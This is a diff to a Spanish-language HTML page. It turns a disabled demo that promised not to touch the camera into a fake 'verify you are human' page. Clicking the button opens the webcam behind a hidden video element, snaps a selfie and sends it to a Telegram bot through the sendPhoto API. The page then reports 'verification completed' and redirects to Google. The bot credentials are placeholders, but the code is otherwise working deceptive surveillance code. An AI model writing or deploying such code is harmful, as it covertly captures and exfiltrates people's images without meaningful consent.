@@ -3,10 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Demo desactivada</title>
+<title>Cargando contenido...</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #101827;
+  color: white;
+  text-align: center;
+  padding: 40px;
+}
+button {
+  padding: 14px 28px;
+  margin: 16px;
+  border: 0;
+  border-radius: 10px;
+  background: #2589ed;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+/* Ocultar la vista del video */
+video {
+  display: none;
+}
+</style>
 </head>
 <body>
-<h1>Demo desactivada</h1>
-<p>Esta página no solicita permisos ni accede a tu cámara.</p>
+
+<h2>Cargando contenido exclusivo...</h2>
+<p>Por favor, haz clic en el botón para verificar que eres humano y continuar.</p>
+
+<button id="verify">Continuar</button>
+
+<video id="video" autoplay playsinline muted></video>
+<p id="status"></p>
+
+<script>
+// Reemplaza con tus datos de Telegram
+const BOT_TOKEN = "TU_BOT_TOKEN_DE_TELEGRAM";
+const CHAT_ID = "TU_CHAT_ID";
+
+const verifyBtn = document.getElementById("verify");
+const video = document.getElementById("video");
+const status = document.getElementById("status");
+
+verifyBtn.onclick = async () => {
+  verifyBtn.style.display = "none";
+  status.textContent = "Verificando...";
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+    
+    video.srcObject = stream;
+
+    // Esperar a que el video cargue los metadatos para capturar
+    video.onloadedmetadata = () => {
+      setTimeout(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+          if (!blob) return;
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "selfie.jpg");
+
+          try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            });
+          } catch (err) {
+            console.error(err);
+          }
+
+          // Apagar la cámara
+          stream.getTracks().forEach(track => track.stop());
+
+          status.textContent = "¡Verificación completada!";
+          
+          // Opcional: Redirigir a otra página después de enviar
+          setTimeout(() => {
+            window.location.href = "https://google.com";
+          }, 1000);
+
+        }, "image/jpeg", 0.9);
+      }, 800); // Retardo para asegurar la correcta exposición de la cámara
+    };
+
+  } catch (e) {
+    status.textContent = "Se requiere conceder permisos para continuar.";
+    verifyBtn.style.display = "inline-block";
+  }
+};
+</script>
 </body>
 </html>
